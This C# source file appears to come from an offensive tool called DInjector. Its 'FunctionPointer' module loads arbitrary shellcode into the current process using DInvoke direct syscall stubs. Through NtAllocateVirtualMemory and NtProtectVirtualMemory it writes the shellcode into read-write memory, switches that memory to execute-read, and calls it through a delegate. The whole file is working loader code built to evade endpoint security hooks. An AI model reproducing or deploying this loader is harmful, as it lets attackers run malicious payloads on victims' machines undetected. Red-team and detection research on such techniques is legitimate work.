using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class FunctionPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtFreeVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            ref IntPtr regionSize,
            uint freeType);

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            ntstatus = sysNtProtectVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(FunctionPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
            f();

            #endregion

            #region NtFreeVirtualMemory (shellcode)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtFreeVirtualMemory");
            NtFreeVirtualMemory sysNtFreeVirtualMemory = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFreeVirtualMemory));

            regionSize = IntPtr.Zero;

            ntstatus = sysNtFreeVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == 0)
                Console.WriteLine("(FunctionPointer) [+] NtFreeVirtualMemory");
            else
                Console.WriteLine($"(FunctionPointer) [-] NtFreeVirtualMemory: {ntstatus}");

            #endregion
        }
    }
}
